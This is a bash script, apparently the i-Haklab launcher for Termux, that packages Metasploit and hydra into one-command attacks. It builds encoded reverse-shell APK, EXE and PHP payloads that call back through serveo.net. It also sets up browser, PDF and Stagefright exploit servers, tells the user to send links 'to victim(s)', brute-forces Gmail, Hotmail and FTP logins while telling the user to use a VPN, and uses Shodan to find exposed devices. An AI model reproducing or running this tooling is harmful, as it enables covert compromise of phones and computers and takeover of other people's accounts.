#!/data/data/com.termux/files/usr/bin/bash
#Created on Dec/2018
IFS=$'\n\t'
#trap ctrl_c 2
source /data/data/com.termux/files/usr/libexec/colors
function ctrl_c() {
                echo
                printf "$Y\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n"
}
banner() {
	if [ -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
		bash $iHAKLAB/.set/libexec/banner/i-Haklab
		sleep 1
	fi
}
k-boom() {
	if [ -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
		bash $iHAKLAB/.set/libexec/banner/k-boom
	fi
}
chk-api() {
	command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
}
chk-sudo() {
	command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
}
chk-msf() {
	command -v msfconsole > /dev/null || { printf "$R\n[W]->$W Metasploit needed$R |$W please install it"; exit; }
}
chk-php() {
	command -v php > /dev/null || { printf "$R\n[W]->$W php not found$R |$W run apt install php"; exit; }
}
chk-ssh() {
	command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
}
chk-mega() {
	command -v megadl > /dev/null || { printf "$R\n[W]->$W megatools not found$R |$W run apt install megatools"; exit; }
}
chk-hydra() {
	command -v hydra > /dev/null || { printf "$R\n[W]->$W hydra not found$R |$W run apt install hydra"; exit; }
}
if [ -L ~/storage/external-1 ]; then
	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
else
        iHAKLAB=/data/data/com.termux/files/home/i-Haklab
fi

while [ "$USER" = "root" ]; do
	printf "$R\n[W]:-> You need to be a common user$W\n"
	exit
done
until [ -d $iHAKLAB ]; do
	printf "$R\n[W]:-> i-Haklab needed$W |$Y Do y ou wanna install it?$W\n"
	while read -p "[yes/no]:-> " yesorno && [ -z $yesorno ]; do
		continue
	done
if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
        cd ~/i-Haklab;bash setup
else 
	printf "$G\n[!]-> Have a nice hacking day!!\n\n"
	exit
fi
done
TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep -iv instasudo | grep -iv QG | grep -iv i-Haklab_login | grep -iv check-root | grep -iv functions | grep -n -iv lock)
TARGET=(0 1 2 3 29)
SSH=$(netstat | grep -c "ssh")
LOCALHOST=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
CHECKROOT=$(bash $iHAKLAB/.set/to-install/check-root)
if [ "$CHECKROOT" = "root" ]; then
	LPORT=80
else
	LPORT=4546
fi
if [ -z $1 ] || [ $1 = help ]; then
	banner
	printf "$Y\n[i]->$W i-Haklab v.1.0 (c) 2019 by Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. Please do not use in military or secret service organizations, or for illegal purposes.\n\nSyntax: i-Haklab [-arg-] [-option-]\n
Arguments  |    Options     |    Description
╰─help─────➤────────────────➤ Show this help menu
╰─list─────➤────────────────➤ List all available tools/frameworks
╰─show─────➤──tools/books───➤ Show details about specific tool and books availables to be downloaded
    |		╰─────|─────➤ example : i-Haklab show bettercap
    |		      ╰─────➤ example : i-Haklab show books
|   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
╰─install──➤───tool─name────➤ Install tools or frameworks
╰─remove───➤───tool─name────➤ Remove tools or frameworks
╰─weechat──➤────────────────➤ Connect with irc Ivam3byCinderella chat
╰─update───➤────────────────➤ Update i-Haklab
╰─upgrade──➤────────────────➤ upgrade i-Haklab by installing/upgrading tools
╰─version──➤────────────────➤ Show i-Haklab version installed
           |       |        |
	   |       |        |
   [--] Automatitation Arguments [--]
Arguments  |    options     |    Description
╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
╰───apk────➤──inlan/outlan──➤ Create a coded payload apk with msfvenom
|               ╰─────|─────➤ LPORT=4546 Payload=android/meterpreter/reverse_tcp apk=inlan.apk
|                     ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
|                             Payload=android/meterpreter/reverse_tcp
╰─paylink──➤─pc/nexam/soa5──➤ Create a link payload with handler
|    |        ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
|    |            |    |      example: i-Haklab paylink pc 2
|    |            ╰────|────➤ For targets [0]nexxus and [29]samsung
|    |                 |      example: i-Haklab paylink nexam 29
|    |                 ╰────➤ For android operative system equal at version 5 to down
|    ╰─────➤───evilserver───➤ Create a php file with a reverse payload
╰──paypdf──➤────────────────➤ Create a pdf file with a reverse payload
╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
|               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
|                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
|                             LHOST=serveo.net file=outlan.exe
╰─shodan───➤────────────────➤ Search vulnerable servers using metasploit with shodan
╰─bfmail───➤──email─passwd──➤ Start a brute force attack wiyh hydra tool at email(hotmail/gmail) account
|   ╰──────➤─────gmail──────➤ example: i-Haklab bfgmail victim@gmail.com passwords.txt
|   ╰──────➤──hotmail/live──➤ example: i-Haklab bfgmail victim@live.com passwords.txt
╰──bfftp───➤─user─passwd─ip─➤ Start a brute force attack with hydra at ftp server
|    ╰─────➤────────────────➤ example: i-Haklab bfftp users.txt passwords.txt 0.0.0.0
╰─serveo───➤────────────────➤ Start a SSH client to request TCP port forwarding from the server and proxy
|    ╰─────➤────domain──────➤ Start a SSH client to request port forwarding with especific dns
|__________________________________________________________________________________________\n\n"
elif [ $1 = list ]; then
	banner
	printf "$TOOL"
elif [ $1 = show ] && [ -z $2 ]; then
        printf "$R[w]->$W Show argument need an option\n"
elif [ $1 = show ] && [ $2 ]; then
	TOOL=$(ls $iHAKLAB/.set/libexec/Readme/ | grep $2)
	if [ "$TOOL" = $2 ]; then
		banner
		cat $iHAKLAB/.set/libexec/Readme/$2
		echo
	elif [ $2 = books ]; then #&& [ $3 = $BOOK ]; then
		banner
		cat $iHAKLAB/.set/libexec/Books/List | awk '{print $1,$2}'
		printf "$Y\n[?]->$W Type the book's number or press$R enter$W to exit\n"
		while read -p "[+]:─➤ " ANSW && [ -z $ANSW ]; do
			exit
		done
		if [ ! -z $ANSW ]; then
			BOOK=$(cat -n $iHAKLAB/.set/libexec/Books/List | grep $ANSW | awk '{print $NF}')
			if [ ! -z $BOOK ]; then
				chk-mega
				megadl https://mega.nz/$BOOK
			else
				printf "$R[w]->$W Unable to locate option $ANSW\n"
				exit
			fi
		fi
	elif [ $2 = tutorials ]; then
		banner
		cat $iHAKLAB/.set/libexec/Tutorials/List
		printf "$G\n[?]─> Choose one option:─➤ "
		read ANSW
		let TUTO=$(cat $iHAKLAB/.set/libexec/Tutorials/List | grep -oE $ANSW )
		if [ "$ANSW" = $TUTO ]; then
			chk-api
			termux-open https://t.me/Ivam3byCinderella/$ANSW
		else
			clear
			banner
			printf "$R[w]->$W Unable to locate option $ANSW\n"
		fi
	elif [ $2 = QG ]; then
		if [ -d $iHAKLAB/QuickGuides ]; then
			banner
			ls $iHAKLAB/QuickGuides
			printf "$Y\n[?]->$W Type QG name or press$R enter$W to exit\n"
			while read -p "[+]:─➤ " ANSW && [ -z $ANSW ]; do
				exit
			done
			if [ -e $iHAKLAB/QuickGuides/$ANSW ]; then
				exec bash $iHAKLAB/QuickGuides/$ANSW
			else
				printf "$R[w]->$W Unable to locate QG $ANSW\n"
			fi
		else
			printf "$R[w]->$W Quick Guides was removed$R |$W please install it\n"
		fi
	else
		printf "$R[w]->$W Unable to locate option $2\n"
	fi
elif [ $1 = install ] && [ -z $2 ]; then
	printf "$R[w]->$W Install argument need an option\n"
elif [ $1 = install ] && [ $2 ]; then
	banner
	TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep $2)
	if [ "$TOOL" = $2 ]; then
		bash $iHAKLAB/.set/to-install/$TOOL
	else
		printf "$R[w]->$W Unable to locate tool $2\n"
		sleep 1
		printf "$G[i]->$W Trying with apptitude repositories . . .\n"
		sleep 1
		apt install $2 -y
	fi
elif [ $1 = remove ] && [ -z $2 ]; then
        printf "$R[w]->$W remove argument need an option\n"
elif [ $1 = remove ] && [ $2 ]; then
        TOOL=$(ls $iHAKLAB/.set/to-remove | grep -iv .zip | grep $2)
        if [ "$TOOL" = $2 ]; then
		banner
		bash $iHAKLAB/.set/to-remove/$TOOL
		k-boom
	elif [ -e $PREFIX/bin/$2 ]; then
		banner
		apt remove $2 -y
		apt autoremove -y
		k-boom
	else
		printf "$R[w]->$W Unable to locate tool/framework $2\n"
	fi
elif [ $1 = weechat ]; then
	banner
	if [ ! -e $PREFIX/bin/weechat ]; then
		apt install weechat -y
	fi
	printf "$Y\n   [!]->$W After start weechat type the next commands$Y <-[!]$Y\n/server add freenode chat.freenode.net/6697 -ssl -autoconnect\n                   /connect freenode\n                  /nick your-nickname\n               /join #Ivam3byCinderella$G\n               $R[w]-> USE SOME VPN <-[w]$G\n\n                 Press enter to start$W\n"
	read enter
	weechat
	k-boom
elif [ $1 = update ]; then
	banner
	CHECK=$(cd $iHAKLAB;git pull | grep -oE Already)
	if [ $CHECK ]; then 
		printf "$G\n[i]->$W Already up to date$G <-[i]$W\n"
	else
		printf "$Y\n[i]->$W There is a new version, run i-Haklab upgrade$Y <-[i]$W\n"
	fi
elif [ $1 = upgrade ]; then
	banner
	cd $iHAKLAB;git pull > /dev/null
	curl https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/upgrade -o $PREFIX/tmp/upgrade
	chmod +x $PREFIX/tmp/upgrade
	bash $PREFIX/tmp/upgrade
	rm $PREFIX/tmp/upgrade
elif [ $1 = version ]; then
	banner
	cat $iHAKLAB/README.md | grep -o v.*.*.9 | awk '{print $1}'
elif [ $1 = apk ] && [ -z $2 ]; then
	printf "$R[w]->$W apk argument need an option\n"
elif [ $1 = apk ] && [ $2 ]; then
	if [ $2 = inlan ]; then
		banner
		if [ ! -d ~/java/handler ]; then
			mkdir -p ~/java/handler
		fi
		chk-msf
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o inlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
		echo "use exploit/multi/handler" > ~/java/handler/inlan.apk.rc
		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/inlan.apk.rc
		echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.apk.rc
		echo "set LPORT 4546" >> ~/java/handler/inlan.apk.rc
		echo "run" >> ~/java/handler/inlan.apk.rc
		printf "$Y[i]->$W Payload saved as$G inlan.apk$W\n"
		printf "$Y[i]->$W Handler file saved as$G inlan.apk.rc$W\n"
	elif [ $2 = outlan ]; then
		banner
		if [ ! -d ~/java/handler ]; then
			mkdir -p ~/java/handler
		fi
		chk-msf
		msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
		echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
		echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
		echo "set LPORT 4546" >> ~/java/handler/outlan.apk.rc
		echo "run" >> ~/java/handler/outlan.apk.rc
		printf "$Y[i]->$W Payload saved as$G outlan.apk$W\n"
		printf "$Y[i]->$W Handler file saved as$G outlan.apk.rc$W\n"
	else
		printf "$R[w]->$W invalid option\n"
	fi
elif [ $1 = payexe ] && [ -z $2 ]; then
        printf "$R[w]->$W payexe argument need an option\n"
elif [ $1 = payexe ] && [ $2 ]; then
        if [ $2 = inlan ]; then
                banner
		if [ ! -d ~/java/handler ]; then
			mkdir -p ~/java/handler
		fi
		chk-msf
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -f exe -e x86/shikata_ga_nai -i 5 -o inlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
                echo "use exploit/multi/handler" > ~/java/handler/inlan.exe.rc
                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/inlan.exe.rc
                echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.exe.rc
                echo "set LPORT 4546" >> ~/java/handler/inlan.ex.rc
                echo "run" >> ~/java/handler/inlan.exe.rc
                printf "$Y[i]->$W Payload saved as$G inlan.exe$W\n"
                printf "$Y[i]->$W Handler file saved as$G inlan.exe.rc$W\n"
        elif [ $2 = outlan ]; then
                banner
		if [ ! -d ~/java/handler ]; then
			mkdir -p ~/java/handler
		fi
		chk-msf
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -f exe -e x86/shikata_ga_nai -i 5 -o outlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
                echo "use exploit/multi/handler" > ~/java/handler/outlan.exe.rc
                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/outlan.exe.rc
                echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.exe.rc
                echo "set LPORT 4546" >> ~/java/handler/outlan.exe.rc
                echo "run" >> ~/java/handler/outlan.exe.rc
                printf "$Y[i]->$W Payload saved as$G outlan.exe$W\n"
                printf "$Y[i]->$W Handler file saved as$G outlan.exe.rc$W\n"
        else
                printf "$R[w]->$W invalid option\n"
        fi
elif [ $1 = paylink ] && [ -z $2 ]; then
	printf "$R[w]->$W paylink argument need an option and target\n"
elif [ $1 = paylink ] && [ $2 = pc ] && [ -z $3 ]; then
	printf "$R[w]->$W pc options need a target\n"
elif [ $1 = paylink ] && [ $2 = pc ] && [ $3 ]; then
	until [ -d ~/java/handler/ ]; do
		printf "$R[w]->$W The hanlder box is empty\n"
		exit
	done
	for i in ${TARGET[*]}; do
		if [ $3 = $i ]; then
			if [ ! -e ~/java/handler/paylink-pc-$3.rc ]; then
				banner
				echo "use exploit/multi/browser/java_jre17_jmxbean_2" > ~/java/handler/paylink-pc-$3.rc
				echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-pc-$3.rc
				echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-pc-$3.rc
				echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-pc-$3.rc
				echo "set LPORT 4546" >> ~/java/handler/paylink-pc-$3.rc
				echo "set URIPATH /" >> ~/java/handler/paylink-pc-$3.rc
				echo "set target $3" >> ~/java/handler/paylink-pc-$3.rc
				echo "run" >> ~/java/handler/paylink-pc-$3.rc
				if [ $CHECKROOT = "root" ]; then
					chk-sudo
					chk-msf
					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
					sleep 1
					sudo msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
				else
					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
					sleep 1
					chk-msf
					msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
				fi
			else
				printf "$R[w]->$W File paylink-pc-$3.rc already exist\n"
			fi
		fi
	done
elif [ $1 = paylink ] && [ $2 = nexam ] && [ -z $3 ]; then
        printf "$R[w]->$W nexam option need a target\n"
elif [ $1 = paylink ] && [ $2 = nexam ] && [ $3 ]; then
        until [ -d ~/java/handler/ ]; do
                printf "$R[w]->$W The hanlder box is empty\n"
                exit
        done
        for i in ${TARGET[*]}; do
                if [ $3 = $i ]; then
                        if [ ! -e ~/java/handler/paylink-nexam-$3.rc ]; then
				banner
                                echo "use exploit/android/browser/stagefright_mp4_tx3g_64bit" > ~/java/handler/paylink-nexam-$3.rc
                                echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-nexam-$3.rc
                                echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-nexam-$3.rc
                                echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-nexam-$3.rc
                                echo "set LPORT 4546" >> ~/java/handler/paylink-nexam-$3.rc
                                echo "set URIPATH /" >> ~/java/handler/paylink-nexam-$3.rc
                                echo "set target $3" >> ~/java/handler/paylink-nexam-$3.rc
                                echo "run" >> ~/java/handler/paylink-nexam-$3.rc
                                if [ $CHECKROOT = "root" ]; then
					chk-sudo
					chk-msf
					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
					sleep 1
                                        sudo msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
                                else
					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
					sleep 1
					chk-msf
                                        msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
                                fi
                        else
                                printf "$R[w]->$W File paylink-nexam-$3.rc already exist\n"
                        fi
                fi
        done
elif [ $1 = paylink ] && [ $2 = soa5 ]; then
        until [ -d ~/java/handler/ ]; do
                printf "$R[w]->$W The hanlder box is empty\n"
                exit
        done
	if [ ! -e ~/java/handler/paylink-soa5.rc ]; then
		banner
		echo "use exploit/android/browser/webview_addjavascriptinterface" > ~/java/handler/paylink-soa5.rc
                echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
                echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-soa5.rc
                echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
                echo "set LPORT 4546" >> ~/java/handler/paylink-soa5.rc
                echo "set URIPATH /" >> ~/java/handler/paylink-soa5.rc
                echo "run" >> ~/java/handler/paylink-soa5.rc
		if [ $CHECKROOT = "root" ]; then
			chk-sudo
			chk-msf
			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
			sleep 1
			sudo msfconsole -q -r ~/java/handler/paylink-soa5.rc
                else
			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
			sleep 1
			chk-msf
                        msfconsole -q -r ~/java/handler/paylink-soa5.rc
                fi
        else
                printf "$R[w]->$W File paylink-nexam-soa5.rc already exist\n"
        fi
elif [ $1 = paylink ] && [ $2 = evilserver ]; then
	chk-sudo
	chk-msf
	chk-php
phpayload() {
	printf "$G[-]-> i-Haklab :$W creating payload$Y (it could take a while)$W\n"
	if [ -e $SERVERPATH/index.php ]; then
		mv $SERVERPATH/index.php $SERVERPATH/index.php.O
	fi
	msfvenom -f raw -p php/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4826 > $SERVERPATH/index.php
	}
handler() {
	echo "use exploit/multi/handler" > ~/java/handler/evilserver.rc
	echo "set PAYLOAD php/meterpreter/reverse_tcp" >> ~/java/handler/evilserver.rc
	echo "set LHOST $LOCALHOST" >> ~/java/handler/evilserver.rc
        echo "set LPORT 4826" >> ~/java/handler/evilserver.rc
        echo "run" >> ~/java/handler/evilserver.rc
	}
phpend() {
	printf "$G[-]-> i-Haklab :$W send to victim(s) :$Y http://$LOCALHOST:$LPORT\n$W"
	printf "$Y[!]-> i-Haklab :$W now open another window and active the handler mode executing$G i-Haklab handler evilserver.rc$W\n"
	printf "$G[-]-> i-Haklab :$W press$R CTRL+C$W to stop\n"
	}
clean() {
	if [ -e $SERVERPATH/index.php.O ]; then
		cat $SERVERPATH/index.php.O > index.php
		rm $SERVERPATH/index.php.O
	fi
	}
	banner
	printf "$G[-]-> i-Haklab :$W creating server path\n"
	sleep 2
	if [ ! -d $PREFIX/var/service/php/ ]; then
		mkdir -p $PREFIX/var/service/php
	fi
	SERVERPATH=/data/data/com.termux/files/usr/var/service/php/
	phpayload
	handler
	phpend
	if [ $CHECKROOT = 'root' ]; then
		sudo php -S $LOCALHOST:$LPORT -t $SERVERPATH > /dev/null
	else
		php -S $LOCALHOST:$LPORT -t $SERVERPATH > /dev/null
	fi
	clean
elif [ $1 = serveo ] && [ -z $2 ]; then
	if [ $SSH = "1" ]; then 
		killall -2 ssh > /dev/null
	fi
	banner
	chk-ssh
	ssh -R 48263:$LOCALHOST:$LPORT serveo.net
elif [ $1 = serveo ] && [ $2 ]; then
	LINK=$2
	if [ $SSH = "1" ]; then 
		killall -2 ssh > /dev/null 
	fi
	banner
	chk-ssh
	ssh -R $LINK:80:$LOCALHOST:$LPORT serveo.net
elif [ $1 = handler ] && [ -z $2 ]; then
	banner
	printf "$R[w]->$W handler argument need an option$R |$W use one of those:\n"
	if [ -d ~/java/handler ]; then
		ls ~/java/handler | grep .rc | sort
	else
		printf "$R[w]->$W The hanlder box is empty\n"
	fi
elif [ $1 = handler ] && [ $2 ]; then
	if [ -e ~/java/handler/$2 ]; then
		if [ $CHECKROOT = "root" ]; then
			banner
			chk-sudo
			chk-msf
			sudo msfconsole -q -r ~/java/handler/$2
		else 
			banner
			chk-msf
			msfconsole -q -r ~/java/handler/$2
		fi
	else
		printf "$R[w]->$W File $2 doesn't exist\n"
	fi
elif [ $1 = shodan ]; then
	chk-msf
	if [ ! -e $PREFIX/opt/metasploit-framework/documentation/api/apikey ]; then
		touch $PREFIX/opt/metasploit-framework/documentation/api/apikey
	fi
	APIKEYFILE=$PREFIX/opt/metasploit-framework/documentation/api/apikey
	if [ ! $(cat $APIKEYFILE) ]; then
		printf "$Y[?]->$W Type your shodan APIKEY "
		while read -p ">> " ANSW && [ -z $ANSW ]; do
                printf "$R[w]-> Go to www.shodan.io to get your APIKEY$W\n"
		exit
        done
        echo $ANSW > $APIKEYFILE
	fi
        APIKEY=$(cat $APIKEYFILE)
	if [ -e $iHAKLAB/.set/shodan/query ]; then
		printf "$Y[?]->$W Choose a type of search :\n"
		cat $iHAKLAB/.set/shodan/query | sort
		echo
		while read -p ">> " QUERY && [ -z $QUERY ]; do
			printf "$R"
		done
	else
		printf "$R[w]-> ERROR :$W Not such query file\n"
	fi
        echo "use auxiliary/gather/shodan_search" > ~/java/handler/shodan-cam.rc
        echo "set SHODAN_APIKEY $APIKEY" >> ~/java/handler/shodan-cam.rc
        echo "set QUERY \"$QUERY\"" >> ~/java/handler/shodan-cam.rc
        echo "run" >> ~/java/handler/shodan-cam.rc
	printf "$Y[!]-> If some target need user/passwd you can use those :$W\n"
	cat $iHAKLAB/.set/shodan/usrpasswd.txt
	printf "\n\tpress$G ENTER$W to continue\n"
	read enter
        msfconsole -q -r ~/java/handler/shodan-cam.rc
elif [ $1 = paypdf ] && [ -z $2 ]; then
	printf "$R[w]->$W argument paypdf need a pdf file name\n"
elif [ $1 = paypdf ] && [ $2 ]; then
	banner
	chk-msf
	printf "$G[-]-> i-Haklab :$W creating pdf file and running handler\n"
	echo "use exploit/android/fileformat/adobe_reader_pdf_js_interface" > ~/java/handler/paypdf.rc
	echo "set LHOST serveo.net" >> ~/java/handler/paypdf.rc
        echo "set LPORT 48263" >> ~/java/handler/paypdf.rc
	echo "set FILENAME $2.pdf" >> ~/java/handler/paypdf.rc
        echo "run" >> ~/java/handler/paypdf.rc
	echo "use exploit/multi/handler" >> ~/java/handler/paypdf.rc
	echo "set LHOST $LOCALHOST" >> ~/java/handler/paypdf.rc
	echo "set LPORT $LPORT" >> ~/java/handler/paypdf.rc
	echo "run" >> ~/java/handler/paypdf.rc
	if [ $CHECKROOT = 'root' ]; then
		sudo msfconsole -q -r ~/java/handler/paypdf.rc
	else
		msfconsole -q -r ~/java/handler/paypdf.rc
	fi
elif [ $1 = bfmail ] && [ -z $2 ]; then
        printf "$R[w]->$W bfmail argument need a mail/victim as option 1$G\n[ex]->$W i-Haklab bfmail victim@gmail.com passwords.txt"
elif [ $1 = bfmail ] && [ $2 ] && [ -z $3 ]; then
        printf "$R[w]->$W bfmail argument need a passwords file as option 2$G\n[ex]->$W i-Haklab bfmail victim@hotmail.com passwords.txt"
elif [ $1 = bfmail ] && [ $2 ] && [ $3 ]; then
        echo $2 > $PREFIX/tmp/bfmail
        MAIL=$(cat $PREFIX/tmp/bfmail | grep -oE '([hotgmailve]{4,7})')
        if [ ! -e $3 ]; then
                printf "$R[w]->$W File for passwords not found"
        elif [ -e $3 ] && [ "$MAIL" = "hotmail" -o "$MAIL" = "live" -o "$MAIL" = "gmail" ]; then
                rm $PREFIX/tmp/bfmail
                printf "$R[w]-> USE SOME VPN <-[w]$W\n  press$G enter$W to start\n"
                read enter
		if [ "$MAIL" = hotmail -o "$MAIL" = "live" ]; then
			SMTP=smtp.live.com
		elif [ "$MAIL" = "gmail" ]; then
			SMTP=smtp.gmail.com
		else
			printf "$R[w]->$W There is not a valid server"
		fi
		chk-hydra
                hydra -S -l $2 -P $3 -e ns -V -s 465 $SMTP smtp
        fi
elif [ $1 = bfftp ] && [ -z $2 ]; then
        printf "$R[w]->$W bfftp argument need a users file as option 1$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
elif [ $1 = bfftp ] && [ $2 ] && [ -z $3 ]; then
        printf "$R[w]->$W bfftp argument need a passwords file as option 2$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ -z $4 ]; then
        printf "$R[w]->$W bfftp argument need an ip/victim as option 3$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ $4 ]; then
        if [ ! -e $2 ]; then
                printf "$R[w]->$W File for users not found"
        elif [ ! -e $3 ]; then
                printf "$R[w]->$W File for passwords not found"
        elif [ -e $2 ] && [ -e $3 ]; then
                printf "$R[w]-> USE SOME VPN <-[w]$W\n  press$G enter$W to start"
                read enter
		chk-hydra
                hydra -L $2 -P $3 $4 ftp
        fi
else
	printf "$R[w]->$W Invalid argument $1 $R|$W Use help to main menu\n"
fi
#                                               @Ivam3
